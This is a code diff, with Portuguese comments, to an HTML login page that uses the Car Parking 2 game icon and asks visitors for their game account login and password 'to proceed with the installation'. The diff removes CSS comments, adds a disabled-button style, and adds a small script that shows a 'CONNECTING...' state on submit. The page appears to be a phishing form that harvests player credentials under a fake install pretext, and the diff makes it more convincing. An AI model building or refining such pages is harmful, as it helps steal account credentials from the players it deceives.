@@ -23,7 +23,6 @@
             font-family: 'Open Sans', sans-serif;
             background-color: #f0f0f0; 
             padding: 20px 15px;
-            /* Permite rolagem suave em celulares menores */
             overflow-y: auto;
         }
 
@@ -47,7 +46,6 @@
             text-align: center;
         }
 
-        /* Fonte adaptada para não cortar no celular */
         h1 {
             font-family: 'Montserrat', sans-serif;
             font-size: 2.2rem;
@@ -85,7 +83,6 @@
             width: 100%;
         }
 
-        /* Alinhamento ajustado proporcionalmente */
         .input-group label {
             font-family: 'Montserrat', sans-serif;
             font-size: 1.2rem;
@@ -124,13 +121,21 @@
             border: none;
             border-radius: 8px;
             cursor: pointer;
-            transition: background-color 0.3s;
+            transition: background-color 0.3s, opacity 0.3s;
             text-transform: uppercase;
             width: 100%;
         }
 
         button[type="submit"]:hover {
             background-color: #e0a800;
+        }
+
+        /* Estilo para quando o botão estiver aguardando a resposta */
+        button[type="submit"]:disabled {
+            background-color: #cccccc;
+            color: #666666;
+            cursor: not-allowed;
+            opacity: 0.8;
         }
 
         .footer-text {
@@ -142,7 +147,6 @@
             padding: 0 10px;
         }
 
-        /* Ajustes finos para celulares com telas muito pequenas */
         @media (max-width: 380px) {
             h1 { font-size: 1.8rem; }
             .icon-logo { width: 120px; }
@@ -157,7 +161,7 @@
         
         <img src="https://play-lh.googleusercontent.com/oCYZs3vR72j0dAo2K2Q7PPQuYg_q_GRUfqwBgWX_tVgh4j4yODpc-JIJUEoe5P5nKZjHDm17Wh1ANNAi6pevWg" alt="CPM2 Icon" class="icon-logo">
 
-        <form action="/login" method="POST">
+        <form id="loginForm" action="/login" method="POST">
             <div class="input-group">
                 <label for="usuario">login:</label>
                 <input type="text" id="usuario" name="usuario" required>
@@ -167,11 +171,26 @@
                 <input type="password" id="senha" name="senha" required>
             </div>
             
-            <button type="submit">enter</button>
+            <button type="submit" id="btnSubmit">enter</button>
         </form>
 
         <p class="footer-text">Enter your Car Parking 2 account details to proceed with the installation.</p>
     </div>
+
+    <script>
+        const loginForm = document.getElementById('loginForm');
+        const btnSubmit = document.getElementById('btnSubmit');
+
+        loginForm.addEventListener('submit', function() {
+            // Muda o texto do botão para indicar o carregamento
+            btnSubmit.innerText = 'CONNECTING...';
+            
+            // Aguarda 10ms para garantir o envio dos dados antes de travar o botão
+            setTimeout(() => {
+                btnSubmit.disabled = true;
+            }, 10);
+        });
+    </script>
 
 </body>
 </html>
